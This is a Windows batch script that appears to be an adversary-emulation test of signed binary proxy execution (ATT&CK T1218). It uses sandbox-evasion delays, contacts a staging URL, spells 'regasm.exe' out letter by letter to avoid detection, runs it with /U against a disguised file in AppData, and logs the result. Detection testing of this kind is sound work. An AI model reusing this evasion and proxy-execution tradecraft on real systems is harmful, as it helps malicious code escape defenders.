@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM === PHR_ CONSTANTS (plain literals - NEVER encoded) ===
SET aqkrpy=%APPDATA%\7829\bd5a6241
SET pdkfx=https://10.0.0.49
SET uvbysa=https://10.0.0.49/stage/2/icon.png?7829-10
SET hxozubt=ITZEL-S2BO
SET keaxwo=10
SET oimxy=potoshop.txt
SET zfvdop=7829

REM === LOG FILE LOCATION ===
SET logfile=%APPDATA%\!keaxwo!\macula-simulations.log

REM === INITIAL DELAY (evade sandbox) ===
echo [!DATE! !TIME!][DEBUG][!hxozubt!]: Initial_delay_start>>> "!logfile!" 2>nul
ping -n 30 127.0.0.1 >nul

REM === HEARTBEAT CHECK ===
SET heart=1
SET herr=

echo [!DATE! !TIME!][DEBUG][!hxozubt!]: Heartbeat_check_start>>> "!logfile!" 2>nul
curl -k -s -o nul !uvbysa! || (SET heart=0 & SET herr=connection_refused)
echo [!DATE! !TIME!][DEBUG][!hxozubt!]: Heartbeat_check_complete>>> "!logfile!" 2>nul

IF !heart! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!hxozubt!]: Heartbeat_failed_skipping>>> "!logfile!" 2>nul
    GOTO :EOF
)

REM === DELAY BETWEEN OPERATIONS ===
timeout /t 8 /nobreak >nul

REM === OBSCURE REGASM.EXE CHARACTER-BY-CHARACTER ===
REM Build "regasm.exe" via substring operations
SET x1=r
SET x2=e
SET x3=g
SET x4=a
SET x5=s
SET x6=m
SET x7=.
SET x8=e
SET x9=x
SET x10=e
SET lo1=!x1!!x2!!x3!!x4!!x5!!x6!
SET lo2=!x7!!x8!!x9!!x10!
SET lolbin=!lo1!!lo2!

REM === CHANGE DIRECTORY ===
echo [!DATE! !TIME!][DEBUG][!hxozubt!]: Directory_change_to_!aqkrpy!>>> "!logfile!" 2>nul
cd /d "!aqkrpy!" 2>nul || (SET direrr=1 & GOTO logfail)
echo [!DATE! !TIME!][DEBUG][!hxozubt!]: Directory_change_complete>>> "!logfile!" 2>nul

REM === RANDOM DELAY ===
SET /A randdelay=!RANDOM! %% 15 + 5
echo [!DATE! !TIME!][DEBUG][!hxozubt!]: Random_delay_!randdelay!s>>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T !randdelay! >nul

REM === EXECUTE REGASM WITH /U FLAG ===
SET execerr=
SET execres=1

echo [!DATE! !TIME!][DEBUG][!hxozubt!]: Regasm_exec_start>>> "!logfile!" 2>nul
!lolbin! /U "!oimxy!" 2>nul || (SET execres=0 & SET execerr=assembly_load_failed)
echo [!DATE! !TIME!][DEBUG][!hxozubt!]: Regasm_exec_complete>>> "!logfile!" 2>nul

REM === FINAL DELAY ===
timeout /t 12 /nobreak >nul

:logfail
REM === TTP LOGGING ===
REM Normalize timestamp: YYYY-MM-DD HH:MM:SS.SSS
FOR /F "tokens=2-4 delims=/ " %%a IN ("!DATE!") DO SET yyyy=%%c
FOR /F "tokens=2-4 delims=/ " %%a IN ("!DATE!") DO SET mm=%%a
FOR /F "tokens=2-4 delims=/ " %%a IN ("!DATE!") DO SET dd=%%b
IF !mm! LSS 10 SET mm=0!mm!
IF !dd! LSS 10 SET dd=0!dd!
SET hh=!TIME:~0,2!
IF !hh! LSS 10 SET hh=0!hh!
SET timestamp=!yyyy!-!mm!-!dd! !TIME:~0,8!.000

REM Log T1218 execution
(
    echo [!timestamp!][!hxozubt!]: !keaxwo!-!zfvdop!-T1218^|Signed_Binary_Proxy_Execution_Regsvcs/Regasm=!execres!:!execerr!
) >> "!logfile!" 2>nul || echo [!DATE! !TIME!][DEBUG][!hxozubt!]: Log_write_failed>>> "!logfile!" 2>nul

echo [!DATE! !TIME!][DEBUG][!hxozubt!]: Simulation_complete>>> "!logfile!" 2>nul

ENDLOCAL